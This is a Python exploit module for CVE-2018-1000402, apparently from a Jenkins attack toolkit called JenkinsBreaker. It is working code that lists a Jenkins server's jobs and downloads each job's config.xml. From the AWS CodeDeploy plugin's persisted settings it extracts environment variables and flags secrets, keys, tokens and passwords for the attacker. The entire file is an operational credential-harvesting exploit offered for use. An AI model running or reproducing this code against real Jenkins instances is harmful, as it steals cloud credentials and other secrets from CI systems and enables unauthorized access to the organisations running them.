"""
CVE-2018-1000402: AWS CodeDeploy Plugin Environment Variable Exposure

The AWS CodeDeploy Plugin persisted environment variables from the last run of any project
with the post-build step configured in the job's config.xml file. In some cases, this allows
users with file system access or Extended Read permission to obtain potentially sensitive
environment variables by accessing the project's config.xml.
"""

import requests
import xml.etree.ElementTree as ET
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2018-1000402"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="AWS CodeDeploy Plugin Environment Variable Exposure",
    description="Exposure of sensitive environment variables persisted in job config.xml",
    affected_versions=["<= 1.19"],
    mitre_attack=["T1552.001", "T1078"],
    severity="medium",
    references=[
        "https://www.jenkins.io/security/advisory/2018-06-25/",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-1000402"
    ],
    requires_auth=True,
    requires_crumb=False,
    tags=["information-disclosure", "credentials", "config-file"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has AWS CodeDeploy plugin installed.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/pluginManager/api/json?depth=1"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            for plugin in data.get('plugins', []):
                if plugin.get('shortName') == 'codedeploy':
                    version = plugin.get('version', '')
                    console.print(f"[yellow][*] Found AWS CodeDeploy Plugin version: {version}[/yellow]")
                    return True
        return False
    except Exception as e:
        console.print(f"[red][!] Error checking vulnerability: {e}[/red]")
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2018-1000402 to extract environment variables from job configurations.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host (unused for this exploit)
        lport: Listener port (unused for this exploit)
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (AWS CodeDeploy Environment Variable Exposure)...[/yellow]")
    
    discovered_vars = {}
    jobs_checked = 0
    vulnerable_jobs = []
    
    try:
        console.print("[cyan][*] Enumerating Jenkins jobs...[/cyan]")
        jobs_url = f"{tool.jenkins_url}/api/json?tree=jobs[name,url]"
        r = requests.get(
            jobs_url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code != 200:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Failed to enumerate jobs: HTTP {r.status_code}"
            )
        
        jobs = r.json().get('jobs', [])
        console.print(f"[cyan][*] Found {len(jobs)} jobs, checking for AWS CodeDeploy configuration...[/cyan]")
        
        for job in jobs:
            job_name = job.get('name')
            job_url = job.get('url', '').rstrip('/')
            jobs_checked += 1
            
            config_url = f"{job_url}/config.xml"
            try:
                config_r = requests.get(
                    config_url,
                    auth=tool.auth,
                    headers=tool.custom_headers,
                    proxies=tool.proxies,
                    verify=False,
                    timeout=10
                )
                
                if config_r.status_code == 200:
                    xml_content = config_r.text
                    
                    if 'com.amazonaws.codedeploy.AWSCodeDeployPublisher' in xml_content:
                        console.print(f"[green][+] Found AWS CodeDeploy configuration in job: {job_name}[/green]")
                        vulnerable_jobs.append(job_name)
                        
                        try:
                            root = ET.fromstring(xml_content)
                            
                            for publisher in root.iter('com.amazonaws.codedeploy.AWSCodeDeployPublisher'):
                                env_vars = {}
                                
                                for child in publisher:
                                    if child.text and child.text.strip():
                                        env_vars[child.tag] = child.text.strip()
                                
                                if env_vars:
                                    discovered_vars[job_name] = env_vars
                                    console.print(f"[green][+] Extracted environment variables from {job_name}:[/green]")
                                    for key, value in env_vars.items():
                                        if any(keyword in key.lower() for keyword in ['key', 'secret', 'password', 'token', 'credential']):
                                            console.print(f"    {key}: {value[:20]}... [SENSITIVE]")
                                        else:
                                            console.print(f"    {key}: {value}")
                        
                        except ET.ParseError as e:
                            console.print(f"[yellow][!] Failed to parse XML for {job_name}: {e}[/yellow]")
                
            except Exception as e:
                console.print(f"[red][!] Error checking job {job_name}: {e}[/red]")
        
        console.print(f"[cyan][*] Checked {jobs_checked} jobs, found {len(vulnerable_jobs)} with AWS CodeDeploy[/cyan]")
        
        if discovered_vars:
            return ExploitResult(
                exploit=CVE_ID,
                status="success",
                details=f"Extracted environment variables from {len(discovered_vars)} job(s)",
                data={
                    "jobs_checked": jobs_checked,
                    "vulnerable_jobs": vulnerable_jobs,
                    "environment_variables": discovered_vars,
                    "sensitive_keys_found": sum(
                        1 for job_vars in discovered_vars.values()
                        for key in job_vars.keys()
                        if any(k in key.lower() for k in ['key', 'secret', 'password', 'token', 'credential'])
                    )
                }
            )
        else:
            return ExploitResult(
                exploit=CVE_ID,
                status="not_vulnerable",
                details="No AWS CodeDeploy configurations with environment variables found"
            )
    
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Execution error: {str(e)}"
        )
